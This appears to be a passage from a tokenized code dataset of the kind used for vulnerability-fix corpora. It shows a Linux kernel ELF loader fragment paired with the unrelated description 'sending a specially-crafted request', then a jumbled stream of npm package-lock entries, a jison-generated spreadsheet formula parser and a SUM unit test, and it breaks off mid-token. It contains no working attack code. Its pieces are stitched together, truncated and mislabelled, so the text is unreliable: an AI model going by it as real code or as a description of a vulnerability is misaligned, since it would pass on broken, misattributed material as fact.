"the", "way", "of", "the", "*", "default", "mmap", "base", ",", "as", "well", "as", "whatever", "program", "they", "*", "might", "try", "to", "exec", ".", "This", "is", "because", "the", "brk", "will", "*", "follow", "the", "loader", ",", "and", "is", "not", "movable", ".", "*", "/", "load_bias", "=", "ELF_ET_DYN_BASE", "-", "vaddr", ";", "if", "(", "current", "-", ">", "flags", "&", "PF_RANDOMIZE", ")", "load_bias", "+", "=", "arch_mmap_rnd", "(", ");", "load_bias", "=", "ELF_PAGESTART", "(", "load_bias", ")", ";"], "docstring_tokens": ["sending", "a", "specially-crafted", "request"]}
{"contents": ["empty"], "code_tokens": ["\"", "version", "\"", ":", "\"", "2", ".", "0", ".", "1", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "@", "handsontable", "/", "formulajs", "/", "-/", "formulajs", "-", "2", ".", "0", ".", "1", ".", "tgz", "\"", ",", "\"", "integrity", "\"", ":", "\"", "sha512", "-", "jTdJO", "/", "6ZmuaHoiTdnraGbPkdnA7m0VMrZ54vWXi22WpwnsIKAWbqjWTwvDoSuEpcc7", "/", "YHVIVlSDtfXHKmaYhdQ", "=", "=\"", ",", "\"", "@", "handsontable", "/", "jstat", "\"", ":", "\"", "^", "1", ".", "0", ".", "0", "\"", ",", "\"", "bessel", "\"", ":", "\"", "^", "0", ".", "2", ".", "0", "\"", "\"", "@", "handsontable", "/", "jstat", "\"", ":", "{", "\"", "version", "\"", ":", "\"", "1", ".", "0", ".", "0", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "@", "handsontable", "/", "jstat", "/", "-/", "jstat", "-", "1", ".", "0", ".", "0", ".", "tgz", "\"", ",", "\"", "integrity", "\"", ":", "\"", "sha512", "-", "5XxZ9xIk6iSjrc1p5N", "/", "yI2dofBXp0IzZVgrkETDC196SxoJCRNOeKgM9fTHMhoxa02wuaZPLp6stojlppNxP", "/", "A", "=", "=\"", "}", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "acorn", "-", "jsx", "/", "-/", "acorn", "-", "jsx", "-", "3", ".", "0", ".", "1", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "acorn", "/", "-/", "acorn", "-", "3", ".", "3", ".", "0", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "ansi", "-", "escapes", "/", "-/", "ansi", "-", "escapes", "-", "3", ".", "1", ".", "0", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "util", "/", "-/", "util", "-", "0", ".", "10", ".", "3", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "babel", "-", "plugin", "-", "istanbul", "/", "-/", "babel", "-", "plugin", "-", "istanbul", "-", "4", ".", "1", ".", "6", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "babel", "-", "plugin", "-", "syntax", "-", "object", "-", "rest", "-", "spread", "/", "-/", "babel", "-", "plugin", "-", "syntax", "-", "object", "-", "rest", "-", "spread", "-", "6", ".", "13", ".", "0", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "browserify", "-", "aes", "/", "-/", "browserify", "-", "aes", "-", "1", ".", "2", ".", "0", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "browserify", "-", "rsa", "/", "-/", "browserify", "-", "rsa", "-", "4", ".", "0", ".", "1", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "buffer", "/", "-/", "buffer", "-", "4", ".", "9", ".", "1", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "chalk", "/", "-/", "chalk", "-", "1", ".", "1", ".", "3", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "create", "-", "hash", "/", "-/", "create", "-", "hash", "-", "1", ".", "2", ".", "0", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "create", "-", "hmac", "/", "-/", "create", "-", "hmac", "-", "1", ".", "1", ".", "7", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "d", "/", "-/", "d", "-", "1", ".", "0", ".", "0", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "pify", "/", "-/", "pify", "-", "2", ".", "3", ".", "0", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "diffie", "-", "hellman", "/", "-/", "diffie", "-", "hellman", "-", "5", ".", "0", ".", "3", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "domelementtype", "/", "-/", "domelementtype", "-", "1", ".", "1", ".", "3", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "entities", "/", "-/", "entities", "-", "1", ".", "0", ".", "0", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "eslint", "/", "-/", "eslint", "-", "4", ".", "19", ".", "1", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "espree", "/", "-/", "espree", "-", "3", ".", "5", ".", "4", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "events", "/", "-/", "events", "-", "1", ".", "1", ".", "1", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "external", "-", "editor", "/", "-/", "external", "-", "editor", "-", "2", ".", "2", ".", "0", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "fast", "-", "deep", "-", "equal", "/", "-/", "fast", "-", "deep", "-", "equal", "-", "1", ".", "1", ".", "0", ".", "tgz", "\"", ",", "\"", "dev", "\"", ":", "true", ",", "\"", "optional", "\"", ":", "true", "\"", "dev", "\"", ":", "true", ",", "\"", "optional", "\"", ":", "true", "\"", "optional", "\"", ":", "true", ",", "\"", "dev", "\"", ":", "true", ",", "\"", "optional", "\"", ":", "true", "\"", "dev", "\"", ":", "true", ",", "\"", "optional", "\"", ":", "true", "\"", "dev", "\"", ":", "true", ",", "\"", "optional", "\"", ":", "true", "\"", "dev", "\"", ":", "true", ",", "\"", "optional", "\"", ":", "true", "\"", "optional", "\"", ":", "true", ",", "\"", "optional", "\"", ":", "true", ",", "\"", "dev", "\"", ":", "true", ",", "\"", "optional", "\"", ":", "true", "\"", "optional", "\"", ":", "true", ",", "\"", "optional", "\"", ":", "true", ",", "\"", "dev", "\"", ":", "true", ",", "\"", "optional", "\"", ":", "true", "\"", "optional", "\"", ":", "true", ",", "\"", "dev", "\"", ":", "true", ",", "\"", "optional", "\"", ":", "true", "\"", "optional", "\"", ":", "true", ",", "\"", "optional", "\"", ":", "true", ",", "\"", "dev", "\"", ":", "true", ",", "\"", "optional", "\"", ":", "true", "\"", "dev", "\"", ":", "true", ",", "\"", "optional", "\"", ":", "true", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "ansi", "-", "escapes", "/", "-/", "ansi", "-", "escapes", "-", "1", ".", "4", ".", "0", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "external", "-", "editor", "/", "-/", "external", "-", "editor", "-", "1", ".", "1", ".", "1", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "inquirer", "/", "-/", "inquirer", "-", "1", ".", "2", ".", "3", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "minimist", "/", "-/", "minimist", "-", "1", ".", "2", ".", "0", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "get", "-", "stream", "/", "-/", "get", "-", "stream", "-", "3", ".", "0", ".", "0", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "pify", "/", "-/", "pify", "-", "2", ".", "3", ".", "0", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "htmlparser2", "/", "-/", "htmlparser2", "-", "3", ".", "8", ".", "3", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "readable", "-", "stream", "/", "-/", "readable", "-", "stream", "-", "1", ".", "1", ".", "14", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "is", "/", "-/", "is", "-", "0", ".", "2", ".", "7", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "is", "-", "builtin", "-", "module", "/", "-/", "is", "-", "builtin", "-", "module", "-", "1", ".", "0", ".", "0", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "commander", "/", "-/", "commander", "-", "2", ".", "9", ".", "0", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "lodash", "/", "-/", "lodash", "-", "3", ".", "10", ".", "1", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "lodash", "/", "-/", "lodash", "-", "3", ".", "10", ".", "1", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "json5", "/", "-/", "json5", "-", "0", ".", "5", ".", "1", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "load", "-", "json", "-", "file", "/", "-/", "load", "-", "json", "-", "file", "-", "2", ".", "0", ".", "0", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "pify", "/", "-/", "pify", "-", "2", ".", "3", ".", "0", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "minimist", "/", "-/", "minimist", "-", "0", ".", "0", ".", "8", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "mkdirp", "/", "-/", "mkdirp", "-", "0", ".", "5", ".", "1", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "ncp", "/", "-/", "ncp", "-", "0", ".", "4", ".", "2", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "next", "-", "tick", "/", "-/", "next", "-", "tick", "-", "1", ".", "0", ".", "0", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "node", ".", "extend", "/", "-/", "node", ".", "extend", "-", "1", ".", "0", ".", "8", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "ansi", "-", "escapes", "/", "-/", "ansi", "-", "escapes", "-", "1", ".", "4", ".", "0", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "lodash", "/", "-/", "lodash", "-", "3", ".", "10", ".", "1", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "parse", "-", "asn1", "/", "-/", "parse", "-", "asn1", "-", "5", ".", "1", ".", "1", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "pify", "/", "-/", "pify", "-", "2", ".", "3", ".", "0", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "readable", "-", "stream", "/", "-/", "readable", "-", "stream", "-", "2", ".", "3", ".", "6", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "regexpp", "/", "-/", "regexpp", "-", "1", ".", "1", ".", "0", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "regjsgen", "/", "-/", "regjsgen", "-", "0", ".", "2", ".", "0", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "safe", "-", "regex", "/", "-/", "safe", "-", "regex", "-", "1", ".", "1", ".", "0", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "sha", ".", "js", "/", "-/", "sha", ".", "js", "-", "2", ".", "4", ".", "11", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "strip", "-", "ansi", "/", "-/", "strip", "-", "ansi", "-", "3", ".", "0", ".", "1", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "strip", "-", "eof", "/", "-/", "strip", "-", "eof", "-", "1", ".", "0", ".", "0", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "rimraf", "/", "-/", "rimraf", "-", "2", ".", "2", ".", "8", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "through", "/", "-/", "through", "-", "2", ".", "3", ".", "8", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "async", "/", "-/", "async", "-", "0", ".", "2", ".", "10", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "uuid", "/", "-/", "uuid", "-", "2", ".", "0", ".", "3", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "winston", "/", "-/", "winston", "-", "0", ".", "8", ".", "3", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "async", "/", "-/", "async", "-", "0", ".", "2", ".", "10", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "wrap", "-", "ansi", "/", "-/", "wrap", "-", "ansi", "-", "2", ".", "1", ".", "0", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "xmlbuilder", "/", "-/", "xmlbuilder", "-", "3", ".", "1", ".", "0", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "lodash", "/", "-/", "lodash", "-", "3", ".", "10", ".", "1", ".", "tgz", "\"", ",", "\"", "prepublish", "\"", ":", "\"", "npm", "run", "clean", "&", "&", "npm", "run", "check", "&", "&", "npm", "run", "build", "\"", "\"", "@", "handsontable", "/", "formulajs", "\"", ":", "\"", "^", "2", ".", "0", ".", "1", "\"", ",", "$", "$", "=", "yy", ".", "trimEdges", "(", "yytext", ")", ".", "split", "(", "',", "')", ";", "/", "*", "parser", "generated", "by", "jison", "0", ".", "4", ".", "18", "*", "/", "var", "parser", "=", "{", "trace", ":", "function", "trace", "(", ")", "{", "}", ",", "this", ".", "$", "=", "yy", ".", "trimEdges", "(", "yytext", ")", ".", "split", "(", "',", "')", ";", "parseError", ":", "function", "parseError", "(", "str", ",", "hash", ")", "{", "var", "error", "=", "new", "Error", "(", "str", ")", ";", "error", ".", "hash", "=", "hash", ";", "throw", "error", ";", "parse", ":", "function", "parse", "(", "input", ")", "{", "_token_stack", ":", "_handle_error", ":", "test_match", ":", "function", "(", "match", ",", "indexed_rule", ")", "{", "lex", ":", "function", "lex", "(", ")", "{", "begin", ":", "function", "begin", "(", "condition", ")", "{", "popState", ":", "function", "popState", "(", ")", "{", "_currentRules", ":", "function", "_currentRules", "(", ")", "{", "topState", ":", "function", "topState", "(", "n", ")", "{", "pushState", ":", "function", "pushState", "(", "condition", ")", "{", "it", "(", "'", "should", "evaluate", "function", "with", "arguments", "passed", "as", "an", "stringified", "array", "'", ",", "(", ")", "=", ">", "{", "expect", "(", "parser", ".", "parse", "(", "'", "SUM", "(", "[]", ")'", "))", ".", "toMatchObject", "(", "{", "error", ":", "null", ",", "result", ":", "0", "}", ");", "expect", "(", "parser", ".", "parse", "(", "'", "SUM", "(", "[", "1", "]", ")'", "))", ".", "toMatchObject", "(", "{", "error", ":", "null", ",", "result", ":", "1", "}", ");", "expect", "(", "parser", ".", "parse", "(", "'", "SUM", "(", "[", "1", ",", "2", ",", "3", "]", ")'", "))", ".", "toMatchObject", "(", "{", "error", ":", "null", ",", "result", ":", "6", "}", ");", "}", ");</s>\"", "version", "\"", ":", "\"", "2", ".", "0", ".", "0", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "@", "handsontable", "/", "formulajs", "/", "-/", "formulajs", "-", "2", ".", "0", ".", "0", ".", "tgz", "\"", ",", "\"", "integrity", "\"", ":", "\"", "sha1", "-", "PkH", "+", "27UaGV3VuMJpSv4XHsCPOgI", "=", "\",", "\"", "bessel", "\"", ":", "\"", "^", "0", ".", "2", ".", "0", "\"", ",", "\"", "jStat", "\"", ":", "\"", "^", "1", ".", "7", ".", "0", "\"", "\"", "resolved", "\"", ":", "\"", "http", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "acorn", "-", "jsx", "/", "-/", "acorn", "-", "jsx", "-", "3", ".", "0", ".", "1", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "http", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "acorn", "/", "-/", "acorn", "-", "3", ".", "3", ".", "0", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "http", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "ansi", "-", "escapes", "/", "-/", "ansi", "-", "escapes", "-", "3", ".", "1", ".", "0", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "http", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "util", "/", "-/", "util", "-", "0", ".", "10", ".", "3", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "http", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "babel", "-", "plugin", "-", "istanbul", "/", "-/", "babel", "-", "plugin", "-", "istanbul", "-", "4", ".", "1", ".", "6", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "http", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "babel", "-", "plugin", "-", "syntax", "-", "object", "-", "rest", "-", "spread", "/", "-/", "babel", "-", "plugin", "-", "syntax", "-", "object", "-", "rest", "-", "spread", "-", "6", ".", "13", ".", "0", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "http", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "browserify", "-", "aes", "/", "-/", "browserify", "-", "aes", "-", "1", ".", "2", ".", "0", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "http", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "browserify", "-", "rsa", "/", "-/", "browserify", "-", "rsa", "-", "4", ".", "0", ".", "1", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "http", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "buffer", "/", "-/", "buffer", "-", "4", ".", "9", ".", "1", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "http", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "chalk", "/", "-/", "chalk", "-", "1", ".", "1", ".", "3", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "http", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "create", "-", "hash", "/", "-/", "create", "-", "hash", "-", "1", ".", "2", ".", "0", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "http", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "create", "-", "hmac", "/", "-/", "create", "-", "hmac", "-", "1", ".", "1", ".", "7", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "http", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "d", "/", "-/", "d", "-", "1", ".", "0", ".", "0", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "http", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "pify", "/", "-/", "pify", "-", "2", ".", "3", ".", "0", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "http", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "diffie", "-", "hellman", "/", "-/", "diffie", "-", "hellman", "-", "5", ".", "0", ".", "3", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "http", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "domelementtype", "/", "-/", "domelementtype", "-", "1", ".", "1", ".", "3", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "http", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "entities", "/", "-/", "entities", "-", "1", ".", "0", ".", "0", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "http", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "eslint", "/", "-/", "eslint", "-", "4", ".", "19", ".", "1", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "http", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "espree", "/", "-/", "espree", "-", "3", ".", "5", ".", "4", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "http", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "events", "/", "-/", "events", "-", "1", ".", "1", ".", "1", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "http", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "external", "-", "editor", "/", "-/", "external", "-", "editor", "-", "2", ".", "2", ".", "0", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "http", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "fast", "-", "deep", "-", "equal", "/", "-/", "fast", "-", "deep", "-", "equal", "-", "1", ".", "1", ".", "0", ".", "tgz", "\"", ",", "\"", "dev", "\"", ":", "true", "\"", "dev", "\"", ":", "true", "\"", "dev", "\"", ":", "true", "\"", "dev", "\"", ":", "true", "\"", "dev", "\"", ":", "true", "\"", "dev", "\"", ":", "true", "\"", "dev", "\"", ":", "true", "\"", "dev", "\"", ":", "true", "\"", "dev", "\"", ":", "true", "\"", "dev", "\"", ":", "true", "\"", "dev", "\"", ":", "true", "\"", "resolved", "\"", ":", "\"", "http", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "ansi", "-", "escapes", "/", "-/", "ansi", "-", "escapes", "-", "1", ".", "4", ".", "0", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "http", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "external", "-", "editor", "/", "-/", "external", "-", "editor", "-", "1", ".", "1", ".", "1", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "http", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "inquirer", "/", "-/", "inquirer", "-", "1", ".", "2", ".", "3", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "http", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "minimist", "/", "-/", "minimist", "-", "1", ".", "2", ".", "0", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "http", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "get", "-", "stream", "/", "-/", "get", "-", "stream", "-", "3", ".", "0", ".", "0", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "http", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "pify", "/", "-/", "pify", "-", "2", ".", "3", ".", "0", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "http", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "htmlparser2", "/", "-/", "htmlparser2", "-", "3", ".", "8", ".", "3", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "http", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "readable", "-", "stream", "/", "-/", "readable", "-", "stream", "-", "1", ".", "1", ".", "14", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "http", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "is", "/", "-/", "is", "-", "0", ".", "2", ".", "7", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "http", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "is", "-", "builtin", "-", "module", "/", "-/", "is", "-", "builtin", "-", "module", "-", "1", ".", "0", ".", "0", ".", "tgz", "\"", ",", "\"", "jStat", "\"", ":", "{", "\"", "version", "\"", ":", "\"", "1", ".", "7", ".", "1", "\"", ",", "\"", "resolved", "\"", ":", "\"", "https", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "jStat", "/", "-/", "jStat", "-", "1", ".", "7", ".", "1", ".", "tgz", "\"", ",", "\"", "integrity", "\"", ":", "\"", "sha512", "-", "toueem", "/", "U5hyHM6pqe6OZOL", "/", "5P8MrY7Ss1K8Brg", "+", "TcfX", "+", "RAjDU", "/", "sbwy72fwzmLPQ5ykdBe1UEoWQHc7OSNWMUDQ", "=", "=\"", "}", ",", "\"", "resolved", "\"", ":", "\"", "http", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "commander", "/", "-/", "commander", "-", "2", ".", "9", ".", "0", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "http", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "lodash", "/", "-/", "lodash", "-", "3", ".", "10", ".", "1", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "http", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "lodash", "/", "-/", "lodash", "-", "3", ".", "10", ".", "1", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "http", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "json5", "/", "-/", "json5", "-", "0", ".", "5", ".", "1", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "http", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "load", "-", "json", "-", "file", "/", "-/", "load", "-", "json", "-", "file", "-", "2", ".", "0", ".", "0", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "http", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "pify", "/", "-/", "pify", "-", "2", ".", "3", ".", "0", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "http", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "minimist", "/", "-/", "minimist", "-", "0", ".", "0", ".", "8", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "http", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "mkdirp", "/", "-/", "mkdirp", "-", "0", ".", "5", ".", "1", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "http", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "ncp", "/", "-/", "ncp", "-", "0", ".", "4", ".", "2", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "http", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "next", "-", "tick", "/", "-/", "next", "-", "tick", "-", "1", ".", "0", ".", "0", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "http", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "node", ".", "extend", "/", "-/", "node", ".", "extend", "-", "1", ".", "0", ".", "8", ".", "tgz", "\"", ",", "\"", "resolved", "\"", ":", "\"", "http", ":", "//", "registry", ".", "npmjs", ".", "org", "/", "ansi", "-", "escapes", "/", "-/", 